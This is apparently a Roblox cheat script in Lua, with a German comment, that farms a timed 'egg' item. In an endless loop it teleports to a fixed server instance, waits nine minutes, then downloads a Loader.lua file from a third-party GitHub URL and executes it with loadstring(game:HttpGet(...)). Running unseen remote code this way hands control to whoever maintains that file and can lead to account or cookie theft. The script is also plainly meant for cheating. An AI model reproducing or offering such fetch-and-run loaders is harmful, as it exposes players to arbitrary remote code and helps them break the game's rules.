-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 540
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "8042d8f9-dfc9-46bb-873d-15c046c92910")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
